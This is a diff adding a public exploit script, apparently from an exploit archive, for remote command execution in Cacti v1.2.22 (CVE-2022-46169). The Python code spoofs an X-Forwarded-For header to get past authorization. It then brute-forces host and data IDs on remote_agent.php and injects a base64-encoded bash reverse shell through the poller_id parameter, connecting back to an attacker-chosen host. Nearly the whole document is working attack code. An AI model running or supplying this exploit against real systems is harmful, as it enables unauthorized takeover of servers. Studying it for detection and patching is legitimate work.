@@ -1,0 +1,76 @@
+id: 38407
+date: 03/31/2023
+title: Cacti v1.2.22 - Remote Command Execution Exploit
+author: Riadh Bouchahoua
+cves: CVE-2022-46169
+
+# Exploit Title: Cacti v1.2.22 - Remote Command Execution (RCE)
+# Exploit Author: Riadh BOUCHAHOUA 
+# Vendor Homepage: https://www.cacti.net/
+# Software Links : https://github.com/Cacti/cacti
+# Tested Version: 1.2.2x <= 1.2.22
+# CVE: CVE-2022-46169
+# Tested on OS: Debian 10/11
+
+#!/usr/bin/env python3
+import random
+import httpx, urllib
+
+class Exploit:
+    def __init__(self, url, proxy=None, rs_host="",rs_port=""):
+        self.url = url 
+        self.session = httpx.Client(headers={"User-Agent": self.random_user_agent()},verify=False,proxies=proxy)
+        self.rs_host = rs_host
+        self.rs_port = rs_port
+
+    def exploit(self):
+        # cacti local ip from the url for the X-Forwarded-For header
+        local_cacti_ip  = self.url.split("//")[1].split("/")[0]
+    
+        headers = {
+            'X-Forwarded-For': f'{local_cacti_ip}'
+        }
+        
+        revshell = f"bash -c 'exec bash -i &>/dev/tcp/{self.rs_host}/{self.rs_port} <&1'"
+        import base64
+        b64_revshell = base64.b64encode(revshell.encode()).decode()
+        payload = f";echo {b64_revshell} | base64 -d | bash -"
+        payload = urllib.parse.quote(payload)
+        urls = []
+        
+        # Adjust the range to fit your needs ( wider the range, longer the script will take to run the more success you will have achieving a reverse shell)
+        for host_id in range(1,100):
+            for local_data_ids in range(1,100):
+                urls.append(f"{self.url}/remote_agent.php?action=polldata&local_data_ids[]={local_data_ids}&host_id={host_id}&poller_id=1{payload}")
+                
+        for url in urls:
+            r = self.session.get(url,headers=headers)
+            print(f"{r.status_code} - {r.text}" )
+        pass
+
+    def random_user_agent(self):
+        ua_list = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+        ]
+        return random.choice(ua_list)
+
+def parse_args():
+    import argparse
+    
+    argparser = argparse.ArgumentParser()
+    argparser.add_argument("-u", "--url", help="Target URL (e.g. http://192.168.1.100/cacti)")
+    argparser.add_argument("-p", "--remote_port", help="reverse shell port to connect to", required=True)
+    argparser.add_argument("-i", "--remote_ip", help="reverse shell IP to connect to", required=True)
+    return argparser.parse_args()
+
+def main() -> None:
+    # Open a nc listener (rs_host+rs_port) and run the script against a CACTI server with its LOCAL IP URL 
+    args = parse_args()
+    e = Exploit(args.url, rs_host=args.remote_ip, rs_port=args.remote_port)
+    e.exploit()
+
+if __name__ == "__main__":
+    main()
+
+#  0day.today [2023-04-04]  #
